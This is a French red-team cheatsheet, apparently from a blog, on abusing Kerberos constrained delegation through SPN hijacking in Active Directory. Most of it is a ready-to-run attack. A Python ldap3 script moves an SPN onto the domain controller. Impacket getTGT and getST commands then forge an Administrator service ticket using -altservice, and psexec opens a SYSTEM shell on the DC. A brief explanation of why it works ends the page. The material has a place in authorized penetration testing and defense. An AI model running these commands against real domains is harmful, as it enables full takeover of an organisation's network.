---
title: "Kerberos Constrained Delegation & SPN Hijacking"
date: 2026-03-27
draft: false
author: "keyll0ger"
description: "1. Un compte avec **Constrained Delegation** vers un SPN (ex: HTTP/WEB01.domain) 2. **WriteSPN** sur l'objet cible (ex: DC01$) - souvent via un groupe (IT, etc.)"
summary: "ActiveDirectory | Kerberos Constrained Delegation & SPN Hijacking"
tags:
  - "Active Directory"
  - "Kerberos"
  - "Red Team"
  - "Cheatsheet"
categories:
  - "Cheatsheet"
  - "ActiveDirectory"
ShowToc: true
TocOpen: false
---

## Prérequis
1. Un compte avec **Constrained Delegation** vers un SPN (ex: HTTP/WEB01.domain)
2. **WriteSPN** sur l'objet cible (ex: DC01$) - souvent via un groupe (IT, etc.)

## Attaque

### 1. Déplacer le SPN
```python
#!/usr/bin/env python3
"""spn_hijack.py - Déplacer un SPN d'un objet vers le DC"""
import ldap3

server = ldap3.Server('ldap://<DC_IP>')
conn = ldap3.Connection(server, '<DOMAIN>\\<USER>', '<PASSWORD>',
                        authentication=ldap3.NTLM, auto_bind=True)

# Retirer le SPN de la source
conn.modify('CN=<SOURCE>,CN=Computers,DC=<DOMAIN>,DC=<TLD>',
    {'servicePrincipalName': [(ldap3.MODIFY_DELETE, ['HTTP/<TARGET>.domain'])]})
print(f'Remove: {conn.result["description"]}')

# Ajouter sur le DC
conn.modify('CN=<DC>,OU=Domain Controllers,DC=<DOMAIN>,DC=<TLD>',
    {'servicePrincipalName': [(ldap3.MODIFY_ADD, ['HTTP/<TARGET>.domain'])]})
print(f'Add: {conn.result["description"]}')
```

### 2. Obtenir TGT frais
```bash
faketime -f '+Xh' impacket-getTGT '<domain>/<kcd_user>:<password>' -dc-ip <DC_IP>
export KRB5CCNAME=<kcd_user>.ccache
```

### 3. S4U2Self + S4U2Proxy avec alt-service
```bash
faketime -f '+Xh' impacket-getST \
  -spn 'HTTP/<target>.domain' \
  -impersonate Administrator \
  -dc-ip <DC_IP> \
  -k -no-pass \
  -altservice 'CIFS/<DC>.domain' \
  '<domain>/<kcd_user>'
```

### 4. SYSTEM shell
```bash
export KRB5CCNAME=Administrator@CIFS_<DC>.domain@<DOMAIN>.ccache
faketime -f '+Xh' impacket-psexec -k -no-pass '<domain>/Administrator@<DC>.domain'
```

## Pourquoi ça marche
- Le ticket S4U2Proxy est chiffré avec la clé du service cible
- En déplaçant le SPN sur le DC, le ticket est chiffré avec la clé du DC
- `-altservice` réécrit le nom de service dans le ticket (CIFS au lieu de HTTP)
- Le DC déchiffre le ticket avec sa propre clé → valide
- Le ticket impersonne Administrator → SYSTEM
